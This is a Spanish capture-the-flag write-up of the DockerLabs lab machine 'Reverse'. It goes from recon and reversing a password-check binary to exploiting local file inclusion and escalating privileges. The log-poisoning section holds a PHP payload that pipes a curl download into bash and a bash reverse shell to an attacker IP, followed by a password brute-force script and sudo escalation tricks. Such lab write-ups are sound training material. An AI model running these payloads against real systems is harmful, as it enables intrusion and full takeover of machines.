Máquina **Reverse** de [DockerLabs](https://dockerlabs.es)

Autor: [Yo](https://github.com/maciferna)

Dificultad: Medio

![Reverse](/reverse/img/reverse.png)

# Reconocimiento

Comenzamos con un escaneo de `nmap`:

```css
nmap -sSVC -p- --open --min-rate 5000 -Pn -n -vvv 172.17.0.2 -oN escaneo.txt
```

```css
# Nmap 7.95 scan initiated Fri Dec 27 19:01:46 2024 as: nmap -sSVC -p- --open --min-rate 5000 -Pn -n -vvv -oN escaneo.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000012s latency).
Scanned at 2024-12-27 19:01:47 -03 for 8s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-title: P\xC3\xA1gina Interactiva
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 27 19:01:55 2024 -- 1 IP address (1 host up) scanned in 8.60 seconds
```

Solo vemos un puerto abierto, que es el `80` y en el funciona `Apache httpd 2.4.62` en un `debian`.

###### Pagina web

![Web](/reverse/img/pagina.png)

Si revisamos el código fuente de la página, veremos que hay un archivo javascript al cual la página apunta, este se encuentra en:

```css
/js/script.js
```

luego de revisar el script, veo que si hacemos 20 veces click en la web, nos aparecerá un mensaje que dice "secret_dir", por lo que luego de probar vemos lo siguiente:

![Alerta](/reverse/img/alerta.png)

viendo el mensaje, podemos intuir que existe una carpeta llamada "secret_dir" en el servidor.

Al entrar en ella veremos un archivo que se llama "secret" y tendremos que descargarlo. 

Si ejecutamos `file secret` veremos que es un binario ejecutable y compilado de manera estática. 

Ahora veremos que hace dando permisos de ejecución sobre el y ejecutándolo con `./secret`:

![Secret](/reverse/img/test-secret.png)

vemos que el binario nos pide una contraseña, ademas, este no es vulnerable a un buffer overflow, por lo que podría tratar de ingeniería inversa. 

##### Ingeniería inversa

Para hacerlo, vamos a descargar `ghidra`:

```css
# Arch linux
sudo pacman -S ghidra
# Debian / Ubuntu
sudo apt install ghidra
```

Una vez instalado, ejecutamos el comando `ghidra` desde el terminal y se nos abrirá la interfaz gráfica. Ahora debemos crear un nuevo proyecto e importar el binario. [¿Como Hacerlo? <-- Solo seguir hasta donde exporta el binario, lo demás no hace falta.](https://www.youtube.com/watch?v=aQICC0EtG90&t)

Una vez ghidra termine de hacer su trabajo analizando el binario (probablemente demore ya que el binario fue compilado de manera estática, lo cual lo hace mas pesado), nos llevará a la función `main`, en la cual veremos un poco el flujo de la aplicación que es este:

```css
1: Nos pide una contraseña
2: Imprime el mensaje de "Recibido...."
3: Imprime el mensaje de "Comprobando..."
4: Llama a la funcion "containsRequiredChars"
```

si le damos doble click a la función "containsRequiredChars", nos llevará a lo siguiente:

![Strings](/reverse/img/strings.png)

Esta función lo que hace, es fijarse que lo que introduce el usuario cumpla con las siguientes características:

```css
1: Debe contener 1 "@"
2: Debe contener 1 string "Mi"
3: Debe contener 1 string "S3cRet"
4: Debe contener 1 string "d00m"
5: Debe contener en total 13 caracteres
```

Sabiendo esto, podríamos poner cualquier contraseña que contenga esos caracteres y sería correcta siempre y cuando tenga solo 13, por ejemplo:

```css
Mi@d00mS3cRet
S3cRetMi@d00m
```

![Pass](/reverse/img/pass-test.png)

Como vemos ambas son correctas, al igual que toda contraseña que cumpla con las características solicitadas. Por lo que luego de poner cualquier contraseña correcta, vemos un mensaje en base64 que dice lo siguiente:

```css
g00dj0b.reverse.dl
```

Al parecer tenemos un dominio con un subdominio, por lo que lo agregaremos al `/etc/hosts` con el siguiente formato:

```css
<IP>	reverse.dl g00dj0b.reverse.dl
```

###### Web del subdominio

![Subdominio](/reverse/img/subdomain-web.png)

Vemos que es una página hecha por chatgpt y revisando el código fuente vemos que hay una redirección a un archivo que contiene un posible LFI:

```css
                <li><a href="experiments.php?module=./modules/default.php">Experimentos Interactivos</a></li>
```

por lo que yendo ahí, cambiamos el "./modules/default.php" por "/etc/passwd" y veremos lo siguiente:

![Passwd](/reverse/img/lfi-passwd.png)

Viendo eso, podemos intentar un log poisoning, ya que poner los wrappers de php no nos da nada:

![Logs](/reverse/img/lfi-log.png)

# Intrusión

###### Log Poisoning

Ahora para entrar, simplemente deberemos ejecutar lo siguiente:

```css
nc reverse.dl 80
```

una vez se queda "pillado", metemos lo siguiente:

```css
GET /<?php system('curl 172.17.0.1/shell | bash') ?>
```

Creamos un archivo llamado shell el cual contenga esto:

```css
bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
```

Montamos un servidor con `python`:

```css
sudo python3 -m http.server 80
```

y escuchamos en el puerto 443:

```css
sudo nc -nlvp 443
```

finalmente recargamos la página del lfi con el log, y nos llegará una solicitud al servidor de python, luego de que llegue deberíamos estar dentro.

# Escalada de Privilegios

#### www-data

Primero realizamos un tratamiento de la tty para estar cómodos.

Si ejecutamos `sudo -l` veremos lo siguiente:

```css
┌──[www-data@d28771631d95]─[/var/www/subdominio]
└──╼ $ sudo -l
Matching Defaults entries for www-data on d28771631d95:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on d28771631d95:
    (nova : nova) NOPASSWD: /opt/password_nova
┌──[www-data@d28771631d95]─[/var/www/subdominio]
└──╼ $ 
```

esto significa que podemos ejecutar como el usuario nova el script o binario `/opt/password_nova`, el cual si lo probamos nos pide otra vez una contraseña, pero nos da la pista de que se encuentra en el rockyou. Sabiendo esto, pasaremos el rockyou a la maquina victima usando nueva mente un servidor de python, y luego crearemos un script en `/tmp` con el siguiente contenido:

```bash
#!/bin/bash

if [ $# != 1 ]; then
  echo -e "Uso: $0 <wordlist>"
  exit 1
fi


wordlist=$1

salir(){
  exit 1
}


lineas=$(wc -l $wordlist | awk '{print $1}')
intentos=0

trap salir SIGINT

while IFS= read -r pass; do
  intentos=$(($intentos + 1))
  resultado=$(echo "$pass" | sudo -u nova /opt/password_nova)
  if [ $(echo $resultado | grep "Contraseña incorrecta." -c) == 0 ]; then
    echo -e "Contraseña encontrada: $pass\nResultado: $resultado"
    exit 0
  fi
  echo -ne "$intentos/$lineas\r"
done < "$wordlist"
```

una vez creado, le damos permisos con `chmod +x force.sh` y le pasamos el rockyou. Luego de esperar un rato, nos encontrará la contraseña del script y nos dará también la contraseña de nova, por lo que escalaremos ejecutando `su nova` y poniendo su contraseña.

##### Nova

Nuevamente `sudo -l` y veremos lo siguiente:

```css
┌─[nova@d28771631d95]─[/tmp]
└──╼ $sudo -l
Matching Defaults entries for nova on d28771631d95:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User nova may run the following commands on d28771631d95:
    (maci : maci) NOPASSWD: /lib64/ld-linux-x86-64.so.2
┌─[nova@d28771631d95]─[/tmp]
└──╼ $
```

Por lo que para escalar solo debemos ejecutar `sudo -u maci /lib64/ld-linux-x86-64.so.2 /bin/bash` (se encuentra en gtfobins como `ld.so`).

#### Maci

Ahora `sudo -l` nos dice que podemos ejecutar `clush` como root:

```css
┌─[maci@d28771631d95]─[/tmp]
└──╼ $sudo -l
Matching Defaults entries for maci on d28771631d95:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on d28771631d95:
    (ALL : ALL) NOPASSWD: /usr/bin/clush
┌─[maci@d28771631d95]─[/tmp]
└──╼ $
```

Tenemos dos maneras de escalar (para saber ambas hay que leer el manual), pero la mas simple es la siguiente:

```css
sudo clush -w node[11-14] -b
```

![Root](/reverse/img/root.png)



Gracias por leer ;)
